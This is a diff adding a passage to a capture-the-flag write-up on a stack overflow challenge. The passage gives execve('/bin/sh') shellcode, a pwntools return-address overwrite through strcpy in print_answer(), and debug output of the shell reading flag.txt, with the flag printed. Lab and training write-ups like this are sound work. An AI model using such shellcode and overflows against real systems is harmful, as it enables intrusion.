@@ -367,3 +367,46 @@ Can you read it?
 Your answer was: 999
 ```
 Let's look further using binja.
+
+This one has a couple of separate steps:
+- Get the address of the first variable and add 0x8 to get the address of the buffer 
+- The binary takes 2 inputs:
+  - The first one is where you send the shellcode
+  - The second one is where you send the return overwrite for print_answer()
+- Send the shellcode to be stored in the buffer 
+
+```aiignore
+mov rax, 0x68732f6e69622f
+push rax
+mov rsi, rsp
+mov rdx, 0x0
+lea rdi, [rsp]
+lea rsi, [0x0]
+mov rax, rdi
+mov rax, 0x3b
+syscall
+```
+- Send the overwrite of the return address in print_answer()
+  - This is because the first thing print_answer() does is a strcpy() of the second input
+  - Make sure there are no nulls in the filler portion
+
+```aiignore
+p.sendline((b'B' * target_stack_offset) + p64(shellcode_address))
+```
+And the results are:
+```aiignore
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    b'ls\n'
+[DEBUG] Received 0x10 bytes:
+    b'flag.txt\n'
+    b'number\n'
+flag.txt
+number
+$ cat flag.txt
+[DEBUG] Sent 0xd bytes:
+    b'cat flag.txt\n'
+[DEBUG] Received 0x3d bytes:
+    b'flag{phr4ck_v0lum3_S3v3n_1ssu3_F0rty_N1n3!_6dda4308cbf84a08}\n'
+flag{phr4ck_v0lum3_S3v3n_1ssu3_F0rty_N1n3!_6dda4308cbf84a08}
+```
